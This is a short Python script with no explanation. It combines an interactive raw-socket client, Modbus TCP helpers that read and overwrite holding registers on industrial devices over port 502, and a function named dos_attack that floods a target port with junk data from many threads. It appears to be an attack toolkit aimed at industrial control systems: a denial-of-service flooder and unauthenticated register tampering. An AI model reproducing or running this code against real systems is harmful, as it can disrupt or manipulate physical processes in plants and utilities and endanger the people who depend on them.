import socket
from pymodbus.client import ModbusTcpClient
import threading
def conn(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        while True:
            choose = input("-->")
            choos = bytes(choose, "UTF-8")
            s.send(choos)
            print(s.recv(4960))
def write_value(host, address, value):
    with ModbusTcpClient(host, port=502) as client:
        client.connect()
        client.write_register(address, value, unit=1)
def read_value(host, address):
    with ModbusTcpClient(host, port=502) as client:
        client.connect()
        result = client.read_holding_registers(address, count=1, unit=1)
        return result.registers[0]
def dos_attack(target_ip, target_port, num_threads=10, num_connections_per_thread=100):
    def attack():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            for _ in range(num_connections_per_thread):
                s.send(b"A" * 1024)
        except Exception as e:
            print("Error:", e)
        finally:
            s.close()
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
